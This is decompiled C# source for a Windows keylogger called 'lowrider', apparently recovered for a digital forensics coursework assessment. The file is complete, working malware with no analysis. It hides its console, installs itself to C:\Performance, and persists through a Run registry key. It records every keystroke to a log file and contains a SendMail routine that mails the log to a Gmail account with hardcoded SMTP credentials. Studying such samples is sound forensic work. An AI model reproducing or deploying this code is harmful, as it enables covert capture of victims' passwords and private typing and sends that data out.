// Decompiled with JetBrains decompiler
// Type: lowrider.Program
// Assembly: lowrider, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E92AB3E5-4A5A-4CDC-8509-C82EC3AA3CED
// Assembly location: C:\Users\Nabeel\OneDrive\Academic\UoC\CO7606 - Digital Forensics and Incident Response\Assessment 2\Task 2\Malware\lowrider.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

#nullable disable
namespace lowrider
{
internal class Program
{
	public static string InstallFolderPath = "C:\\Performance\\";
	public static string logsFile = "C:\\Performance\\Stats.dat";
	public static string exeFile = "C:\\Performance\\lowrider.exe";
	public static string installedCheck = "C:\\Performance\\installed.dat";
	public static string currentFileName = Process.GetCurrentProcess().MainModule.FileName;
	private const int SW_HIDE = 0;

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	public static extern short GetAsyncKeyState(int i);

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	private bool IsInstalled() => System.IO.File.Exists(Program.installedCheck);

	private void InstallSelf()
	{
	Directory.CreateDirectory(Program.InstallFolderPath);
	System.IO.File.Create(Program.logsFile).Close();
	System.IO.File.Create(Program.installedCheck);
	new FileInfo(Program.currentFileName).CopyTo(Program.exeFile);
	}

	private void addAutoStart()
	{
	Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("lowrider", (object) Program.exeFile);
	}

	private void logdemkeys()
	{
	using (StreamWriter streamWriter = new StreamWriter(Program.logsFile))
	{
		while (true)
		{
		Thread.Sleep(10);
		for (int i = 0; i < (int) byte.MaxValue; ++i)
		{
			int asyncKeyState = (int) Program.GetAsyncKeyState(i);
			if (asyncKeyState == 1 || asyncKeyState == -32767)
			{
			streamWriter.WriteLine((object) (Keys) i);
			streamWriter.Flush();
			break;
			}
		}
		}
	}
	}

	private static void Main(string[] args)
	{
	Program program = new Program();
	if (((IEnumerable<Process>) Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Assembly.GetEntryAssembly().Location))).Count<Process>() > 1)
		Process.GetCurrentProcess().Kill();
	Program.ShowWindow(Program.GetConsoleWindow(), 0);
	if (!program.IsInstalled())
	{
		program.InstallSelf();
		program.addAutoStart();
	}
	program.logdemkeys();
	}

	private static void SendMail()
	{
	Program program = new Program();
	string str1 = DateTime.Now.ToString("dd\\/MM h\\:mm tt");
	string userName = Environment.UserName;
	try
	{
		string str2 = "8374hj473@gmail.com";
		MailMessage message = new MailMessage();
		SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
		message.From = new MailAddress(str2);
		message.To.Add(str2);
		message.Subject = "Saved keys from " + str1;
		message.Body = "Keystrokes saved from user " + userName;
		Attachment attachment = new Attachment(Program.logsFile);
		message.Attachments.Add(attachment);
		smtpClient.Port = 587;
		smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(str2, "k34594KKdfhf");
		smtpClient.EnableSsl = true;
		smtpClient.Send(message);
	}
	catch (Exception ex)
	{
		Console.WriteLine(ex.ToString());
	}
	}
}
}
